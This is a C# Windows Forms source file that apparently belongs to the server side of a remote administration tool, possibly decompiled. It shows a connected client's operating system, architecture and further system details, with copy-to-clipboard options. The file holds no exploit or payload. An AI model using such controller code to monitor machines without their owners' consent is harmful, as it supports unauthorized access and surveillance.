

using System;
using System.Collections.Generic;
using System.Linq;
using System.Windows.Forms;
using InvokedCommon.Messages;
using InvokedServer.Extensions;
using InvokedServer.Helper;
using InvokedServer.Messages;
using InvokedServer.Networking;


namespace InvokedServer.Forms
{
	public partial class FrmSystemInformation : Form
	{
		private readonly Client _connectClient;
		private readonly SystemInformationHandler _sysInfoHandler;
		private static readonly Dictionary<Client, FrmSystemInformation> OpenedForms = new Dictionary<Client, FrmSystemInformation>();

		public static FrmSystemInformation CreateNewOrGetExisting(Client client)
		{
			if (FrmSystemInformation.OpenedForms.ContainsKey(client))
				return FrmSystemInformation.OpenedForms[client];
			FrmSystemInformation newOrGetExisting = new FrmSystemInformation(client);
			newOrGetExisting.Disposed += (EventHandler)((sender, args) => FrmSystemInformation.OpenedForms.Remove(client));
			FrmSystemInformation.OpenedForms.Add(client, newOrGetExisting);
			return newOrGetExisting;
		}

		public FrmSystemInformation(Client client)
		{
			this._connectClient = client;
			this._sysInfoHandler = new SystemInformationHandler(client);
			this.RegisterMessageHandler();
			this.InitializeComponent();
		}

		private void RegisterMessageHandler()
		{
			this._connectClient.ClientState += new Client.ClientStateEventHandler(this.ClientDisconnected);
			this._sysInfoHandler.ProgressChanged += new MessageProcessorBase<List<Tuple<string, string>>>.ReportProgressEventHandler(this.SystemInformationChanged);
			MessageHandler.Register((IMessageProcessor)this._sysInfoHandler);
		}

		private void UnregisterMessageHandler()
		{
			MessageHandler.Unregister((IMessageProcessor)this._sysInfoHandler);
			this._sysInfoHandler.ProgressChanged -= new MessageProcessorBase<List<Tuple<string, string>>>.ReportProgressEventHandler(this.SystemInformationChanged);
			this._connectClient.ClientState -= new Client.ClientStateEventHandler(this.ClientDisconnected);
		}

		private void ClientDisconnected(Client client, bool connected)
		{
			if (connected)
				return;
			this.Invoke(new MethodInvoker(((Form)this).Close));
		}

		private void FrmSystemInformation_Load(object sender, EventArgs e)
		{
			this.Text = WindowHelper.GetWindowTitle("System Information", this._connectClient);
			this._sysInfoHandler.RefreshSystemInformation();
			this.AddBasicSystemInformation();
		}

		private void FrmSystemInformation_FormClosing(object sender, FormClosingEventArgs e)
		{
			this.UnregisterMessageHandler();
		}

		private void SystemInformationChanged(object sender, List<Tuple<string, string>> infos)
		{
			this.lstSystem.Items.RemoveAt(2);
			foreach (Tuple<string, string> info in infos)
				this.lstSystem.Items.Add(new ListViewItem(new string[2]
				{
		  info.Item1,
		  info.Item2
				}));
			this.lstSystem.AutosizeColumns();
		}

		private void copyAllToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.lstSystem.Items.Count == 0)
				return;
			string str = string.Empty;
			foreach (ListViewItem listViewItem in this.lstSystem.Items)
			{
				str = listViewItem.SubItems.Cast<ListViewItem.ListViewSubItem>().Aggregate<ListViewItem.ListViewSubItem, string>(str, (Func<string, ListViewItem.ListViewSubItem, string>)((current, lvs) => current + lvs.Text + " : "));
				str = str.Remove(str.Length - 3);
				str += "\r\n";
			}
			ClipboardHelper.SetClipboardTextSafe(str);
		}

		private void copySelectedToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.lstSystem.SelectedItems.Count == 0)
				return;
			string str = string.Empty;
			foreach (ListViewItem selectedItem in this.lstSystem.SelectedItems)
			{
				str = selectedItem.SubItems.Cast<ListViewItem.ListViewSubItem>().Aggregate<ListViewItem.ListViewSubItem, string>(str, (Func<string, ListViewItem.ListViewSubItem, string>)((current, lvs) => current + lvs.Text + " : "));
				str = str.Remove(str.Length - 3);
				str += "\r\n";
			}
			ClipboardHelper.SetClipboardTextSafe(str);
		}

		private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.lstSystem.Items.Clear();
			this._sysInfoHandler.RefreshSystemInformation();
			this.AddBasicSystemInformation();
		}

		private void AddBasicSystemInformation()
		{
			this.lstSystem.Items.Add(new ListViewItem(new string[2]
			{
		"Operating System",
		this._connectClient.Value.OperatingSystem
			}));
			this.lstSystem.Items.Add(new ListViewItem(new string[2]
			{
		"Architecture",
		this._connectClient.Value.OperatingSystem.Contains("32 Bit") ? "x86 (32 Bit)" : "x64 (64 Bit)"
			}));
			this.lstSystem.Items.Add(new ListViewItem(new string[2]
			{
		"",
		"Getting more information..."
			}));
		}
	}
}